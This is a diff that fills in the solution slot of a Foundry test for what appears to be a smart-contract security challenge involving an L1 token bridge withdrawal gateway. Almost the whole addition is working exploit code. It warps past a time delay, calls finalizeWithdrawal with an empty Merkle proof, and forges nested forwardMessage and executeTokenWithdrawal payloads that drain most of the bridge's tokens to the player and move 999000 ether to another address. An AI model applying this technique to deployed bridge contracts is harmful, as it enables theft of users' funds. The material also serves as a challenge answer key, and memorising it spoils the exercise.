@@ -96,7 +96,125 @@ contract WithdrawalChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_withdrawal() public checkSolvedByPlayer {}
+    function test_withdrawal() public checkSolvedByPlayer {
+        console.log(address(l1Forwarder));
+        console.log(l2Handler);
+        console.log(address(l1TokenBridge));
+        console.logBytes4(l1TokenBridge.executeTokenWithdrawal.selector);
+        console.logBytes4(l1Forwarder.forwardMessage.selector);
+        bytes memory testdata = abi.encode(
+            uint256(1),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729b95),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(1),
+                address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e),
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e),
+                    10 ether
+                )
+            )
+        );
+        console.logBytes(testdata);
+        console.logBytes32(keccak256(testdata));
+        vm.warp(uint256(0x66729b95) + 8 days);
+        bytes32[] memory proof = new bytes32[](1);
+        l1Gateway.finalizeWithdrawal(
+            uint256(0),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729b63),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(0),
+                address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6),
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6),
+                    10 ether
+                )
+            ),
+            proof
+        );
+        l1Gateway.finalizeWithdrawal(
+            uint256(1),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729b95),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(1),
+                address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e),
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    address(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e),
+                    10 ether
+                )
+            ),
+            proof
+        );
+        l1Gateway.finalizeWithdrawal(
+            uint256(3),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729c37),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(3),
+                address(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b),
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    address(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b),
+                    10 ether
+                )
+            ),
+            proof
+        );
+        l1Gateway.finalizeWithdrawal(
+            uint256(4),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729b95),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(4),
+                player,
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    player,
+                    INITIAL_BRIDGE_TOKEN_AMOUNT - 30 ether
+                )
+            ),
+            proof
+        );
+        l1Gateway.finalizeWithdrawal(
+            uint256(2),
+            address(0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16),
+            address(0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5),
+            uint256(0x66729bea),
+            abi.encodeWithSignature(
+                "forwardMessage(uint256,address,address,bytes)",
+                uint256(2),
+                address(0xea475d60c118d7058beF4bDd9c32bA51139a74e0),
+                address(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50),
+                abi.encodeWithSignature(
+                    "executeTokenWithdrawal(address,uint256)",
+                    address(0xea475d60c118d7058beF4bDd9c32bA51139a74e0),
+                    999000 ether
+                )
+            ),
+            proof
+        );
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
